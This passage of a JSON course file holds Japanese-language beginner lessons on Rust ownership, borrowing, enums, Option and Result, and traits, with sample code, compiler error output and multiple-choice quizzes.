        "answer": 1,
        "explain": "Rust のエラーは、場所と原因に線を引いて説明し、help: で直し方まで提案してくれます。"
       }
      ]
     ],
     "id": "01-let-mut"
    },
    {
     "title": "所有権と借用 ― Rust だけの考え方",
     "level": 1,
     "minutes": 22,
     "concepts": [
      "memory",
      "variables",
      "functions"
     ],
     "summary": "値には持ち主が 1 人だけいる（所有権）。代入や関数に渡すと持ち主が移る（ムーブ）、& で借りる、&mut で書き換えのために借りる、clone で複製する。3 つの代表的なコンパイルエラーを実際に起こして読む。",
     "body": "## このレッスンのゴール\n\n- 所有権・ムーブ・借用（`&`）・可変の借用（`&mut`）の意味を説明できる\n- `borrow of moved value` などの代表的なエラーを読み、直し方が分かる\n- AI の Rust のコードに `&`・`.clone()`・`&mut` が多い理由が分かる\n\n## なぜ所有権があるのか\n\nプログラムは、使い終わったメモリを片付けなければいけません（コンピュータの基礎コースの「メモリ」）。\n\n| 言語 | 片付け方 |\n|---|---|\n| Python・Go・JavaScript | **ガベージコレクタ**（GC）が、使われなくなったものを自動で探して片付ける。便利だが、ときどき処理が一瞬止まる |\n| C・C++ | **人が自分で片付ける**（C 言語コースの `free`）。速いが、片付け忘れや二重の片付けがバグや脆弱性になる |\n| **Rust** | **持ち主（所有者）が使い終わったら、自動で片付ける**。誰が持ち主かは、コンパイラが確かめる |\n\nRust は「GC 無しで速い」と「人が間違えない」を、**所有権のルールをコンパイラが確かめる** ことで両立しています。\n\n## ルール 1：持ち主は 1 人。代入すると移る（ムーブ）\n\n```rust\nfn main() {\n    let a = String::from(\"りんご\");\n    let b = a;\n    println!(\"{a}\");\n    println!(\"{b}\");\n}\n```\n\n```text\nerror[E0382]: borrow of moved value: `a`\n --> r2.rs:4:16\n  |\n2 |     let a = String::from(\"りんご\");\n  |         - move occurs because `a` has type `String`, which does not implement the `Copy` trait\n3 |     let b = a;\n  |             - value moved here\n4 |     println!(\"{a}\");\n  |                ^ value borrowed here after move\n  |\nhelp: consider cloning the value if the performance cost is acceptable\n  |\n3 |     let b = a.clone();\n  |              ++++++++\n```\n\n`let b = a;` で、「りんご」の **持ち主が a から b に移りました**（**ムーブ**）。もう a は空っぽなので、使うとエラーです。\n\nPython では `b = a` で **2 つの名前が同じものを指す** だけでした。Rust では **持ち主が引っ越す** と考えます。\n\n```text\nPython：  a ──┐\n          b ──┴→ \"りんご\"     （2 人で共有）\n\nRust：    a     （空っぽ）\n          b ───→ \"りんご\"     （持ち主は b だけ）\n```\n\n### コピーされる型もある\n\n```rust\nlet n = 5;\nlet m = n;\nprintln!(\"数はコピー: {n} {m}\");   // 数はコピー: 5 5\n```\n\n整数・小数・bool などの **小さくて単純な型** は、代入すると **コピー** されるので、両方使えます。エラーの文の `does not implement the Copy trait`（Copy できない型です）は、この違いのことです。String や Vec は大きくなりうるので、勝手にはコピーされません。\n\n## 関数に渡しても移る\n\n```rust\nfn take(s: String) { println!(\"{s}\"); }\n\nfn main() {\n    let a = String::from(\"りんご\");\n    take(a);\n    println!(\"{a}\");\n}\n```\n\n```text\nerror[E0382]: borrow of moved value: `a`\n...\n4 |     take(a);\n  |          - value moved here\n5 |     println!(\"{a}\");\n  |                ^ value borrowed here after move\n  |\nnote: consider changing this parameter type in function `take` to borrow instead if owning the value isn't necessary\n```\n\n関数に渡すと、**持ち主が関数の引数に移ります**。関数が終わると、そこで片付けられます。`note:` は「持ち主になる必要が無いなら、**借りる** 形にしたら？」と提案しています。\n\n## ルール 2：借りる（&）\n\n```rust\nfn print_len(s: &String) {\n    println!(\"{s} は {} バイト\", s.len());\n}\n\nlet a = String::from(\"りんご\");\nprint_len(&a);\nprintln!(\"まだ使える: {a}\");\n```\n\n```text\nりんご は 9 バイト\nまだ使える: りんご\n```\n\n`&a` は「a を **貸す**」、引数の `&String` は「String を **借りる**」という意味です（**借用**）。借りただけなので、関数が終わっても持ち主は a のまま。その後も a を使えます。\n\n（「りんご」が 9 バイトなのは、UTF-8 で日本語 1 文字が 3 バイトだからです。コンピュータの基礎コースの「文字コード」）\n\n### &str と String\n\n| 型 | 意味 | よく使う場面 |\n|---|---|---|\n| `String` | 文字列を **持っている**（変えられる、伸ばせる） | 作った文字列を返す・構造体にしまう |\n| `&str` | 文字列を **借りている**（見るだけ） | **関数の引数**（`fn greet(name: &str)`） |\n\n`\"りんご\"` のように直接書いた文字列は `&str`、`String::from(\"りんご\")` や `\"りんご\".to_string()` で `String` になります。**関数の引数は `&str` で受けるのが定番** です（`String` も `&str` も渡せるので）。\n\n## ルール 3：書き換えのために借りる（&mut）\n\n```rust\nfn add_tax_label(s: &mut String) {\n    s.push_str(\"（税込）\");\n}\n\nlet mut label = String::from(\"120 円\");\nadd_tax_label(&mut label);\nprintln!(\"{label}\");   // 120 円（税込）\n```\n\n`&mut` は「**書き換えてよい**」という約束で貸すことです。貸す側の変数にも `mut` が必要です。\n\n### 書き換え中は、他の人は見られない\n\n```rust\nlet mut v = vec![1, 2, 3];\nlet first = &v[0];        // v を見るために借りている\nv.push(4);                // v を書き換えるために借りようとした\nprintln!(\"{first}\");\n```\n\n```text\nerror[E0502]: cannot borrow `v` as mutable because it is also borrowed as immutable\n3 |     let first = &v[0];\n  |                  - immutable borrow occurs here\n4 |     v.push(4);\n  |     ^^^^^^^^^ mutable borrow occurs here\n5 |     println!(\"{first}\");\n  |                ----- immutable borrow later used here\n```\n\n借用のルールは、**「見るだけの貸し出しは何人にでも」か「書き換えの貸し出しは 1 人だけ」のどちらか** です。同時にはできません。\n\nこれはただの意地悪ではありません。`v.push(4)` で Vec の中身が足りなくなると、Rust は **データを別の広い場所に引っ越す** ことがあります。そうすると、`first` が指していた古い場所はもう無効です。C や C++ では、この「消えた場所を指したまま使う」バグが実際によく起き、セキュリティの穴にもなってきました。**Rust はそれをコンパイルの時点で止めた** わけです。\n\n## clone：複製する\n\n```rust\nlet a = String::from(\"りんご\");\nlet b = a.clone();\nprintln!(\"{a} / {b}\");   // りんご / りんご\n```\n\n`.clone()` は **中身ごと複製** します。持ち主が 2 人になるので、両方使えます。ただし、大きなデータだと時間とメモリを使います。\n\n## まとめ\n\n| 書き方 | 意味 | 元の変数は |\n|---|---|---|\n| `let b = a;` / `take(a)` | **ムーブ**：持ち主が移る | 使えなくなる（Copy な型を除く） |\n| `&a` | **借用**：見るために貸す | 使える。何人にでも貸せる |\n| `&mut a` | **可変の借用**：書き換えのために貸す | 貸している間は、他の人は使えない |\n| `a.clone()` | **複製** | 使える（別物になる） |\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| `.clone()` があちこちに | コンパイルエラーを消すために付けていることが多い。動くが、大きなデータなら無駄が多いかも |\n| `fn f(s: &str)` / `fn f(items: &[T])` | 借りて見るだけの引数（定番の良い形） |\n| `fn f(s: String)` | 持ち主ごと受け取る。呼んだ側はその後 s を使えない |\n| `&mut self` | 自分の中身を変えるメソッド（レッスン 3） |\n| `'a`（`fn f<'a>(x: &'a str) -> &'a str`） | **ライフタイム**：借りたものがいつまで有効か。返す値が「引数と同じだけ有効」という意味 |\n| `Rc<T>` / `Arc<T>` | 持ち主を複数人にする特別な入れ物（Arc はスレッドの間で共有するとき） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`let a = String::from(\"x\"); let b = a; println!(\"{a}\");` がエラーになる理由は？",
        "choices": [
         "String は表示できないから",
         "`let b = a;` で持ち主が b に移り（ムーブ）、a はもう使えないから",
         "a と b が同じ名前だから"
        ],
        "answer": 1,
        "explain": "String は代入すると持ち主が移ります。両方使いたいなら `let b = a.clone();`、見るだけなら `let b = &a;` にします。"
       },
       {
        "question": "関数の引数を `fn show(s: String)` ではなく `fn show(s: &str)` にする利点は？",
        "choices": [
         "借りるだけなので、呼んだ側がその後も文字列を使い続けられる",
         "文字列を書き換えられる",
         "処理が必ず 2 倍速くなる"
        ],
        "answer": 0,
        "explain": "String で受けると持ち主が関数に移ります。見るだけなら借りる `&str` にするのが定番です。"
       },
       {
        "question": "`let first = &v[0]; v.push(4); println!(\"{first}\");` がエラーになるのはなぜ？",
        "choices": [
         "v が空だから",
         "push は使えないから",
         "v を見るために借りている間に、書き換えのために借りようとしたから"
        ],
        "answer": 2,
        "explain": "見るための借用と書き換えのための借用は同時にできません。push で中身が引っ越すと first が無効になりうるので、コンパイラが止めています。"
       }
      ]
     ],
     "id": "02-ownership"
    },
    {
     "title": "構造体・enum・match ― 型で状態を表す",
     "level": 2,
     "minutes": 20,
     "concepts": [
      "classes",
      "types",
      "conditionals"
     ],
     "summary": "struct と impl（&self・&mut self）、データを持てる enum、すべての場合を書かないとコンパイルできない match、null の代わりの Option と unwrap の危険。",
     "body": "## このレッスンのゴール\n\n- `struct` と `impl` のメソッド（`&self`・`&mut self`）を読める\n- データを持てる `enum` と、`match` での分け方を読める\n- `Option<T>`・`Some`・`None`・`unwrap` の意味と危険が分かる\n\n## 構造体と impl\n\n```rust\n#[derive(Debug)]\nstruct Product {\n    name: String,\n    price: u32,\n}\n\nimpl Product {\n    fn new(name: &str, price: u32) -> Self {\n        Product { name: name.to_string(), price }\n    }\n    fn with_tax(&self) -> u32 {\n        self.price * 110 / 100\n    }\n    fn discount(&mut self, yen: u32) {\n        self.price -= yen;\n    }\n}\n\nlet mut apple = Product::new(\"りんご\", 120);\nprintln!(\"{} {}\", apple.name, apple.with_tax());   // りんご 132\napple.discount(20);\nprintln!(\"{:?}\", apple);                            // Product { name: \"りんご\", price: 100 }\n```\n\n| 部分 | 意味 | Python で言うと |\n|---|---|---|\n| `struct Product { ... }` | データの形 | `@dataclass class Product:` |\n| `impl Product { ... }` | Product のメソッドをまとめて書く場所 | クラスの中の `def` |\n| `fn new(...) -> Self` | 作るための関数（`Self` は Product のこと）。`new` という名前は習慣 | `__init__` |\n| `Product::new(...)` | `::` で呼ぶ（self を取らない関数） | `Product(...)` |\n| `&self` | 自分を **見るだけ** のメソッド | `def with_tax(self):` |\n| `&mut self` | 自分を **書き換える** メソッド | `def discount(self, yen):` |\n| `#[derive(Debug)]` | `{:?}` で表示できるようにする（自動で作る） | `__repr__` を自動で |\n\n`&self` と `&mut self` は、レッスン 2 の借用そのものです。Go の「値のレシーバーか、ポインタのレシーバーか」（Go コースのレッスン 3）と似た区別を、**書き換えるかどうか** で書き分けます。`discount` を呼ぶには、`apple` に `mut` が必要です。\n\n`Product { name: ..., price }` の `price` だけの書き方は、`price: price` の省略です。\n\n## enum：どれか 1 つの状態\n\n```rust\n#[derive(Debug)]\nenum Status {\n    Paid,\n    Shipped { tracking: String },\n    Cancelled(String),\n}\n```\n\n注文の状態は「支払い済み」「発送済み」「キャンセル」の **どれか 1 つ** です。Rust の enum は、**それぞれの状態がデータを持てる** のが強みです。\n\n| 状態 | 持っているデータ |\n|---|---|\n| `Paid` | 無し |\n| `Shipped { tracking }` | 追跡番号 |\n| `Cancelled(String)` | 理由 |\n\nPython で表すと、状態ごとにクラスを作る感じです。データベースなら `status` の列と、状態によって NULL だったりそうでなかったりする列が並ぶところを、**「発送済みなら必ず追跡番号がある」** と型で決められます。\n\n## match：すべての場合を分ける\n\n```rust\nfn describe(s: &Status) -> String {\n    match s {\n        Status::Paid => \"支払い済み\".to_string(),\n        Status::Shipped { tracking } => format!(\"発送済み（追跡番号 {tracking}）\"),\n        Status::Cancelled(reason) => format!(\"キャンセル：{reason}\"),\n    }\n}\n```\n\n```text\n支払い済み\n発送済み（追跡番号 AB123）\nキャンセル：在庫切れ\n```\n\n`match` は、値の形で分けて、**中のデータを取り出しながら** 処理します（`tracking`・`reason`）。Python 3.10 の `match` 文とほぼ同じ考え方です。\n\n### 書き忘れるとコンパイルできない\n\n```rust\nenum Status { Paid, Shipped, Cancelled }\nfn label(s: Status) -> &'static str {\n    match s {\n        Status::Paid => \"支払い済み\",\n        Status::Shipped => \"発送済み\",\n    }\n}\n```\n\n```text\nerror[E0004]: non-exhaustive patterns: `Status::Cancelled` not covered\n --> r3b.rs:3:11\n  |\n3 |     match s {\n  |           ^ pattern `Status::Cancelled` not covered\n...\nhelp: ensure that all possible cases are being handled by adding a match arm with a wildcard pattern or an explicit pattern as shown\n  |\n5 ~         Status::Shipped => \"発送済み\",\n6 ~         Status::Cancelled => todo!(),\n```\n\n**`Cancelled` の場合を書き忘れたので、コンパイルできません**。後から新しい状態（`Returned` など）を足したときも、**処理を書き忘れた場所を全部コンパイラが教えてくれます**。Python の `if / elif` では、書き忘れても気づけません。\n\n`_ =>` と書けば「それ以外全部」になります（ただし、新しい状態の追加に気づけなくなる）。\n\n```rust\nlet size = match n { 0 => \"ゼロ\", 1..=9 => \"1 桁\", _ => \"それ以上\" };   // n = 7 → 1 桁\n```\n\n`match` は **値を返せる** ので、このように変数に入れられます。`1..=9` は 1 以上 9 以下です。\n\n## Option：null の代わり\n\nRust には **`null`（None）が普通の値として存在しません**。「無いかもしれない」値は、`Option` という enum で表します。\n\n```rust\nenum Option<T> {    // 標準ライブラリにある（書かなくてよい）\n    Some(T),        // 値がある\n    None,           // 無い\n}\n\nfn find(name: &str) -> Option<u32> {\n    match name {\n        \"りんご\" => Some(120),\n        _ => None,\n    }\n}\n```\n\n`Option<u32>` は「u32 があるかもしれないし、無いかもしれない」という型です。\n\n```rust\nlet p: u32 = find(\"りんご\");\n```\n\n```text\nerror[E0308]: mismatched types\n3 |     let p: u32 = find(\"りんご\");\n  |            ---   ^^^^^^^^^^^^^^ expected `u32`, found `Option<u32>`\n```\n\n**`Option<u32>` は `u32` ではない** ので、そのままでは数として使えません。「無いとき」の処理を書かないと、先に進めない仕組みです。Python で `None` のまま計算して `TypeError` になる、というバグがコンパイルの時点で防がれます。\n\n### 取り出し方\n\n```rust\nmatch find(\"ぶどう\") {\n    Some(p) => println!(\"{p} 円\"),\n    None => println!(\"見つかりません\"),       // 見つかりません\n}\n\nif let Some(p) = find(\"りんご\") {\n    println!(\"if let: {p} 円\");               // if let: 120 円\n}\n\nprintln!(\"{}\", find(\"ぶどう\").unwrap_or(0));  // 0\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `match` | Some と None を両方書く |\n| `if let Some(p) = ...` | Some のときだけ処理する |\n| `.unwrap_or(0)` | None なら 0（Python の `x if x is not None else 0`） |\n| `.unwrap()` | 中身を取り出す。**None なら panic（停止）** |\n| `.expect(\"理由\")` | unwrap と同じだが、止まるときにメッセージを出す |\n\n### ⚠️ unwrap\n\n```rust\nlet p = find(\"ぶどう\").unwrap();\n```\n\n```text\nthread 'main' panicked at r3d.rs:3:28:\ncalled `Option::unwrap()` on a `None` value\n```\n\n`unwrap()` は「**絶対にある** と分かっているから、無い場合は考えない」という書き方で、無ければプログラムが止まります。試し書きや、本当にありえないことが分かっている場所以外では、`match`・`if let`・`unwrap_or`・`?`（次のレッスン）を使います。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `.unwrap()` がたくさん | ⚠️ 失敗すると止まる。特に入力・ファイル・ネットワークの値に使っていないか |\n| `.expect(\"config must exist\")` | 止まる理由が書いてある unwrap。起動時の設定などには OK |\n| `match ... { _ => {} }` | 「それ以外は何もしない」。新しい状態の追加に気づけなくなる |\n| `#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]` | よく使う機能を自動で付ける（表示・複製・比較・JSON の読み書き） |\n| `Option<&User>` | 「ユーザーへの借用があるかもしれない」 |\n| `if let Some(x) = map.get(&key)` | マップにあれば（Go の `v, ok := m[key]`） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`impl Product { fn discount(&mut self, yen: u32) { ... } }` の `&mut self` の意味は？",
        "choices": [
         "このメソッドは自分（Product）の中身を書き換える",
         "このメソッドは Product を新しく作る",
         "このメソッドは Product を見るだけ"
        ],
        "answer": 0,
        "explain": "`&self` は見るだけ、`&mut self` は書き換える、です。呼ぶ側の変数にも mut が必要です。"
       },
       {
        "question": "enum の `match` で、場合を 1 つ書き忘れたらどうなる？",
        "choices": [
         "その場合は何もしない",
         "実行したときにエラー",
         "コンパイルエラーになり、書き忘れた場合を教えてくれる"
        ],
        "answer": 2,
        "explain": "Rust の match はすべての場合を書く必要があります。状態を足したときも、処理を忘れた場所が全部見つかります。"
       },
       {
        "question": "`find(\"ぶどう\").unwrap()` で、find が None を返したら？",
        "choices": [
         "0 が返る",
         "panic してプログラムが止まる",
         "None がそのまま返る"
        ],
        "answer": 1,
        "explain": "unwrap は None に対して呼ぶと止まります。`unwrap_or(0)` や `match` で None の場合を処理します。"
       }
      ]
     ],
     "id": "03-struct-enum-match"
    },
    {
     "title": "Result と ? 演算子 ― 失敗を型で返す",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "errors",
      "types",
      "functions"
     ],
     "summary": "成功（Ok）か失敗（Err）かを表す Result、失敗したらその場で返す ? 演算子、map_err と自分のエラー型、main で ? を使う形。Go の if err != nil や Python の例外との比較。",
     "body": "## このレッスンのゴール\n\n- `Result<T, E>`・`Ok`・`Err` の意味を説明できる\n- `?` 演算子が何をしているかを、Go の `if err != nil` と比べて説明できる\n- `map_err`・自分で作ったエラーの enum・`Box<dyn Error>` を読める\n\n## Result：成功か失敗か\n\n```rust\nuse std::num::ParseIntError;\n\nfn parse_price(s: &str) -> Result<u32, ParseIntError> {\n    let n = s.trim().parse::<u32>()?;\n    Ok(n)\n}\n\nprintln!(\"{:?}\", parse_price(\"120\"));    // Ok(120)\nprintln!(\"{:?}\", parse_price(\"12a\"));    // Err(ParseIntError { kind: InvalidDigit })\n```\n\n`Result` は、レッスン 3 の `Option` の仲間の enum です。\n\n```rust\nenum Result<T, E> {\n    Ok(T),     // 成功。値は T 型\n    Err(E),    // 失敗。エラーは E 型\n}\n```\n\n`Result<u32, ParseIntError>` は「**成功なら u32、失敗なら ParseIntError**」という型です。\n\n| 言語 | 失敗の伝え方 |\n|---|---|\n| Python | 例外を `raise`。`try / except` で受け止める |\n| Go | 戻り値の最後に `error`。`if err != nil` で確かめる（Go コースのレッスン 4） |\n| Rust | 戻り値を `Result` にする。`match` や `?` で扱う |\n\nGo と同じく **失敗も戻り値** ですが、Rust では「成功の値」と「エラー」が **1 つの Result にまとまっている** ので、エラーを確かめずに成功の値だけ使う、ということが **型の上でできません**（Option と同じ）。\n\n## 取り出し方\n\n```rust\nmatch parse_price(\"abc\") {\n    Ok(n) => println!(\"{n} 円\"),\n    Err(e) => println!(\"数ではありません: {e}\"),\n}\n// 数ではありません: invalid digit found in string\n\nlet n = parse_price(\"80\").unwrap_or(0);   // 80\nlet m = parse_price(\"??\").unwrap_or(0);   // 0\n```\n\n`unwrap()`・`expect()`・`unwrap_or()` は、Option と同じように使えます（`unwrap()` は Err なら panic）。\n\n## ? 演算子：失敗したら、すぐ返す\n\n```rust\nlet n = s.trim().parse::<u32>()?;\n```\n\nこの行の最後の **`?`** が、Rust のエラー処理の主役です。\n\n| parse の結果 | `?` がすること |\n|---|---|\n| `Ok(120)` | 中の `120` を取り出して、n に入れる |\n| `Err(e)` | **その場で関数を終わり、`Err(e)` を呼んだ人に返す** |\n\nGo で書くと、こうです。\n\n```go\nn, err := strconv.Atoi(strings.TrimSpace(s))\nif err != nil {\n\treturn 0, err\n}\n```\n\n**Go の `if err != nil { return ..., err }` の 3 行が、Rust では `?` の 1 文字** になります。\n\n### ? を続けて使う\n\n```rust\nfn total(inputs: &[&str]) -> Result<u32, ParseIntError> {\n    let mut sum = 0;\n    for s in inputs {\n        sum += parse_price(s)?;\n    }\n    Ok(sum)\n}\n\nprintln!(\"{:?}\", total(&[\"120\", \"90\", \"200\"]));   // Ok(410)\nprintln!(\"{:?}\", total(&[\"120\", \"x\", \"200\"]));    // Err(ParseIntError { kind: InvalidDigit })\n```\n\n2 つ目は、`\"x\"` のところで `?` が Err を返したので、`\"200\"` は足されずに終わっています。Python の例外が「途中で飛び出して、呼んだ人に伝わる」のと同じ動きを、**戻り値で、しかも `?` という目印付きで** 書いています。どこで失敗しうるかが `?` を探せば分かります。\n\n### ? は Result を返す関数の中だけ\n\n```rust\nfn main() {\n    let n: u32 = \"12a\".parse()?;\n    println!(\"{n}\");\n}\n```\n\n```text\nerror[E0277]: the `?` operator can only be used in a function that returns `Result` or `Option` (or another type that implements `FromResidual`)\n...\nhelp: consider adding return type\n  |\n1 ~ fn main() -> Result<(), Box<dyn std::error::Error>> {\n2 |     let n: u32 = \"12a\".parse()?;\n3 |     println!(\"{n}\");\n4 +     Ok(())\n```\n\n`?` は「Err を **返す**」ので、Result を返す関数の中でしか使えません。`help:` は、**main も Result を返す形にすればよい** と教えてくれています。\n\n```rust\nfn main() -> Result<(), Box<dyn std::error::Error>> {\n    let n: u32 = \"12a\".parse()?;\n    println!(\"{n}\");\n    Ok(())\n}\n```\n\n`()` は「値無し」（Python の None を返す関数）、`Box<dyn std::error::Error>` は「**どんな種類のエラーでもよい**」という型です。AI の Rust のコードの main は、よくこの形になっています。\n\n## 自分のエラー型を作る\n\nファイルの読み込みの失敗と、「中身が空」という自分のエラーを、1 つの型にまとめます。\n\n```rust\n#[derive(Debug)]\nenum ConfigError {\n    Io(std::io::Error),\n    Empty,\n}\n\nfn load(path: &str) -> Result<String, ConfigError> {\n    let text = fs::read_to_string(path).map_err(ConfigError::Io)?;\n    if text.trim().is_empty() {\n        return Err(ConfigError::Empty);\n    }\n    Ok(text)\n}\n\nprintln!(\"{:?}\", load(\"config.toml\"));\n// Err(Io(Os { code: 2, kind: NotFound, message: \"No such file or directory\" }))\nprintln!(\"{:?}\", load(\"empty.toml\"));    // 空白だけのファイル\n// Err(Empty)\n```\n\n| 部分 | 意味 |\n|---|---|\n| `enum ConfigError { Io(...), Empty }` | このモジュールで起きる失敗の種類の一覧（レッスン 3 の enum） |\n| `.map_err(ConfigError::Io)` | 読み込みのエラー（`std::io::Error`）を、`ConfigError::Io` に包み直す |\n| `?` | 包み直した Err なら、そこで返す |\n| `return Err(ConfigError::Empty)` | 自分で失敗を返す |\n\nGo の `fmt.Errorf(\"...: %w\", err)`、Python の `raise ConfigError(...) from e` と同じことです。呼んだ側は `match` で `ConfigError::Io(e)` と `ConfigError::Empty` を分けて処理できます。\n\n実際のプロジェクトでは、このエラー型を簡単に作るための **`thiserror`**、何でも包める **`anyhow`** というクレートがよく使われます。AI のコードで `anyhow::Result<T>` や `#[derive(thiserror::Error)]` を見たら、この話です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| `let x = something()?;` | 失敗したら呼んだ人に返す。成功なら中身を x に |\n| `.unwrap()` / `.expect(...)` | ⚠️ 失敗したら止まる。ライブラリの中や、Web サーバーのリクエストの処理では避ける |\n| `fn main() -> anyhow::Result<()>` | main でも `?` を使える形 |\n| `.map_err(|e| MyError::Db(e))?` | エラーを自分の種類に包んで返す |\n| `.ok_or(MyError::NotFound)?` | Option を Result に変える（None なら NotFound で返す） |\n| `let _ = do_something();` | ⚠️ Result を捨てている（Go の `_` と同じ危険）。Rust はふつう、使わない Result に警告を出す |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`let n = s.parse::<u32>()?;` で、parse が `Err(e)` を返したら？",
        "choices": [
         "n に 0 が入って先に進む",
         "その場で関数を終わり、`Err(e)` を呼んだ人に返す",
         "panic して止まる"
        ],
        "answer": 1,
        "explain": "`?` は Ok なら中身を取り出し、Err ならすぐに返します。Go の `if err != nil { return ..., err }` に当たります。"
       },
       {
        "question": "`fn main() { let x = f()?; }` がコンパイルエラーになる理由は？",
        "choices": [
         "f が存在しないから",
         "`?` は Err を返す書き方なので、Result（か Option）を返す関数の中でしか使えないから",
         "main では関数を呼べないから"
        ],
        "answer": 1,
        "explain": "main を `fn main() -> Result<(), Box<dyn std::error::Error>>` にすれば `?` が使えます。エラーの help: もそう提案していました。"
       },
       {
        "question": "Rust の Result と Python の例外の、大きな違いは？",
        "choices": [
         "Rust は失敗しうることが戻り値の型に書かれ、確かめずに成功の値を使えない",
         "Rust はエラーを無視して先に進む",
         "Python の例外のほうが、必ず速い"
        ],
        "answer": 0,
        "explain": "Result<u32, E> は u32 として使えないので、Err の場合を何らかの形で扱う必要があります。どこで失敗しうるかが型と `?` で分かります。"
       }
      ]
     ],
     "id": "04-result"
    },
    {
     "title": "トレイトとジェネリクス ― 共通の振る舞い",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "generics",
      "classes",
      "types"
     ],
     "summary": "「このメソッドを持つ」という約束のトレイト、impl Trait for 型、デフォルトのメソッド、Display で表示を決める、&impl Trait と <T: Trait> で「その約束を守る型なら何でも」受け取る、dyn と Box、derive。",
     "body": "## このレッスンのゴール\n\n- `trait` と `impl トレイト for 型` を読める\n- `&impl Shape`・`<T: PartialOrd>`・`Box<dyn Shape>` が何を意味するか分かる\n- `#[derive(...)]` で何が自動で用意されるか分かる\n\n## トレイト：「このメソッドを持つ」という約束\n\n```rust\ntrait Shape {\n    fn area(&self) -> f64;\n    fn describe(&self) -> String {\n        format!(\"面積 {:.2}\", self.area())\n    }\n}\n\nstruct Rect { w: f64, h: f64 }\nstruct Circle { r: f64 }\n\nimpl Shape for Rect {\n    fn area(&self) -> f64 { self.w * self.h }\n}\nimpl Shape for Circle {\n    fn area(&self) -> f64 { 3.14 * self.r * self.r }\n    fn describe(&self) -> String { format!(\"円（半径 {}）\", self.r) }\n}\n```\n\n| 部分 | 意味 |\n|---|---|\n| `trait Shape { fn area(&self) -> f64; }` | 「Shape なら `area` を持っている」という約束。中身は書かない（`;`） |\n| `fn describe(&self) -> String { ... }` | 中身付きで書くと **デフォルト** の実装。書き直さなければこれが使われる |\n| `impl Shape for Rect { ... }` | 「Rect は Shape の約束を守ります」と宣言して、中身を書く |\n\nGo のインターフェース（Go コースのレッスン 3）と同じ考え方ですが、Rust では **`impl Shape for Rect` と明示的に書く** のが違いです。Python なら `abc.ABC` の抽象クラスや `typing.Protocol` に近いものです。\n\n## トレイトを持つものなら何でも受け取る\n\n```rust\nfn print_area(s: &impl Shape) {\n    println!(\"{}\", s.describe());\n}\n\nprint_area(&Rect { w: 2.0, h: 3.0 });   // 面積 6.00\nprint_area(&Circle { r: 1.0 });         // 円（半径 1）\n```\n\n`&impl Shape` は「**Shape の約束を守る型なら何でも**（を借りる）」という引数です。Rect は describe を書いていないのでデフォルトの「面積 6.00」、Circle は自分で書いた「円（半径 1）」になりました。\n\n### 違う型をまとめて入れる：Box<dyn Shape>\n\n```rust\nlet shapes: Vec<Box<dyn Shape>> = vec![\n    Box::new(Rect { w: 1.0, h: 1.0 }),\n    Box::new(Circle { r: 2.0 }),\n];\nlet sum: f64 = shapes.iter().map(|s| s.area()).sum();\nprintln!(\"合計 {sum:.2}\");   // 合計 13.56\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `dyn Shape` | 「中身の型は実行するまで分からないが、Shape ではある」 |\n| `Box<...>` | データを別の場所（ヒープ）に置いて、その場所を持つ入れ物。大きさの違う Rect と Circle を、同じ大きさの「箱」として Vec に並べられる |\n\nPython の `shapes = [Rect(...), Circle(...)]` は何も考えずに書けますが、Rust は **大きさが決まったもの** しか Vec に並べられないので、`Box<dyn ...>` で包みます。AI のコードの `Box<dyn std::error::Error>`（レッスン 4）も、「どんなエラーでもよい箱」という同じ書き方です。\n\n## 標準のトレイト\n\n```rust\nuse std::fmt;\n\nstruct Product { name: String, price: u32 }\n\nimpl fmt::Display for Product {\n    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {\n        write!(f, \"{}（{} 円）\", self.name, self.price)\n    }\n}\n\nprintln!(\"{}\", Product { name: \"りんご\".into(), price: 120 });   // りんご（120 円）\n```\n\n`Display` トレイトを実装すると、`{}` での表示を決められます（Python の `__str__`、Go の `String()`）。\n\n| トレイト | できるようになること | Python で言うと |\n|---|---|---|\n| `Display` | `{}` で表示 | `__str__` |\n| `Debug` | `{:?}` で表示 | `__repr__` |\n| `Clone` | `.clone()` で複製 | `copy.deepcopy` |\n| `PartialEq` | `==` で比べる | `__eq__` |\n| `PartialOrd` | `<` `>` で比べる | `__lt__` など |\n| `Iterator` | `for` で回せる・`.map()` などが使える（レッスン 6） | `__iter__` / `__next__` |\n| `From` / `Into` | 型を変換する（`\"x\".into()` で String に） | — |\n\n### derive：よくあるものは自動で\n\n```rust\n#[derive(Debug, Clone, PartialEq)]\nstruct Point { x: i32, y: i32 }\n\nlet p = Point { x: 1, y: 2 };\nlet q = p.clone();\nprintln!(\"{:?} {}\", q, p == q);   // Point { x: 1, y: 2 } true\n```\n\n`#[derive(...)]` に書いたトレイトは、**中身を自動で書いてくれます**。Python の `@dataclass` が `__init__`・`__repr__`・`__eq__` を自動で作るのと同じ感覚です。JSON を扱う `serde` クレートの `Serialize`・`Deserialize` も、ここに書いて使います。\n\n## ジェネリクス：型を後から決める\n\n```rust\nfn largest<T: PartialOrd + Copy>(items: &[T]) -> T {\n    let mut max = items[0];\n    for &x in items {\n        if x > max { max = x; }\n    }\n    max\n}\n\nprintln!(\"{} {}\", largest(&[3, 9, 2]), largest(&[1.5, 0.2]));   // 9 1.5\n```\n\n| 部分 | 意味 |\n|---|---|\n| `<T>` | 型を **T という名前で後から決める**（ジェネリクス）。整数の配列なら T は整数、小数なら小数 |\n| `T: PartialOrd + Copy` | ただし T は「`>` で比べられて（PartialOrd）、コピーできる（Copy）」型に限る（**トレイト境界**） |\n| `&[T]` | T のスライス（配列の一部を借りたもの） |\n\nTypeScript のジェネリクス（TypeScript コースのレッスン 6）、Python の `def largest[T](items: list[T]) -> T:` と同じ考え方です。Rust では **「T に何ができるか」をトレイトで書かないと、`>` すら使えない** のが特徴です。`T: PartialOrd` を消して試すと、`` error[E0369]: binary operation 